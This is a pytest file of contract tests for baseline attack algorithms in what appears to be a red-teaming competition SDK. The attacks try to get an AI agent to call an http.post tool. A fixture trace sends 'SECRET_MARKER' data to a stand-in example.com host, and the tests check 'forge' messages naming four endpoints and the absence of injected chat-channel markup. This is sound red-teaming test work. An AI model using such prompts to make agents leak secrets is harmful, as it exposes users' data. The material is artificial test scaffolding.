"""Contract tests for B022 reserved example.com host suffix."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B008R_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")
B022_ATTACK_PATH = Path("baselines/replaysafe_examplecom_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.example.com",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def test_b022_only_swaps_reserved_host_suffix() -> None:
    parent = _load_attack(B008R_ATTACK_PATH, "classify5_for_b022")
    child = _load_attack(B022_ATTACK_PATH, "examplecom_attack")
    assert child.URL_HOST_SUFFIX == "example.com"
    assert parent._url(0).endswith(".invalid")
    assert child._url(0).endswith(".example.com")
    assert child._url(0) == "http://aa.example.com"
    assert child.SLOW_MULTIPOST_N == parent.SLOW_MULTIPOST_N == 4
    assert child.SPLIT_CLASSIFY_N == parent.SPLIT_CLASSIFY_N == 5
    assert child.SPLIT_THRESHOLD_S == parent.SPLIT_THRESHOLD_S == 12.0
    assert child.REPLAY_SAFE_FRAC == parent.REPLAY_SAFE_FRAC == 0.99
    assert child.REPLAY_BUDGET_MULT == parent.REPLAY_BUDGET_MULT == 1.0
    assert child.PROBE_HOPS == parent.PROBE_HOPS == 0
    assert child.BURST_K == parent.BURST_K == 1
    assert child.TEMPLATE == parent.TEMPLATE
    assert child.FRAME_TEMPLATE == parent.FRAME_TEMPLATE
    assert child.PROMPT_TEMPLATES == parent.PROMPT_TEMPLATES


def test_slow_row_keeps_four_endpoint_forge(monkeypatch: pytest.MonkeyPatch) -> None:
    child = _load_attack(B022_ATTACK_PATH, "examplecom_slow")
    clock = FakeClock()
    monkeypatch.setattr(child.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)
    candidates = child.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    messages = [candidate.user_messages[0] for candidate in candidates]
    plain = [msg for msg in messages if "Call http.post once" in msg]
    forge = [msg for msg in messages if "these 4 endpoints" in msg]
    assert len(plain) == 5
    assert forge
    assert all(msg.count("http://") == 4 for msg in forge)
    assert all(".example.com" in msg for msg in forge)
    assert all(".invalid" not in msg for msg in messages)
    assert all(len(candidate.user_messages) == 1 for candidate in candidates)
    assert set(env.hops) == {8}


def test_fast_row_keeps_plain_single_post(monkeypatch: pytest.MonkeyPatch) -> None:
    child = _load_attack(B022_ATTACK_PATH, "examplecom_fast")
    clock = FakeClock()
    monkeypatch.setattr(child.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=5.0)
    candidates = child.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    messages = [candidate.user_messages[0] for candidate in candidates]
    assert messages
    assert all("these 4 endpoints" not in msg for msg in messages)
    assert all("<|channel|>analysis" not in msg for msg in messages)
    assert all(".example.com" in msg for msg in messages)
    assert all(".invalid" not in msg for msg in messages)
    assert all(len(candidate.user_messages) == 1 for candidate in candidates)


def test_same_routing_count_as_b008r(monkeypatch: pytest.MonkeyPatch) -> None:
    parent = _load_attack(B008R_ATTACK_PATH, "classify5_host_compare")
    child = _load_attack(B022_ATTACK_PATH, "examplecom_count")
    clock_a = FakeClock()
    monkeypatch.setattr(parent.time, "monotonic", clock_a)
    parent_out = parent.AttackAlgorithm().run(
        FiringEnv(clock_a, latency_s=13.0),
        FakeConfig(time_budget_s=9000.0, max_tool_hops=8),
    )
    clock_b = FakeClock()
    monkeypatch.setattr(child.time, "monotonic", clock_b)
    child_out = child.AttackAlgorithm().run(
        FiringEnv(clock_b, latency_s=13.0),
        FakeConfig(time_budget_s=9000.0, max_tool_hops=8),
    )
    assert len(child_out) == len(parent_out)


def test_urls_stay_on_reserved_example_com_hosts() -> None:
    child = _load_attack(B022_ATTACK_PATH, "examplecom_urls")
    for index in range(20):
        url = child._url(index)
        assert url.endswith(".example.com")
        assert not url.endswith(".invalid")
        assert ".co/" not in url + "/"
        assert url.startswith("http://")
        message = child._forge_plan_message(index, child.SLOW_MULTIPOST_N)
        assert "these 4 endpoints" in message
        assert message.count(".example.com") == 4
        assert ".invalid" not in message
        assert ".co" not in message.replace(".example.com", "")
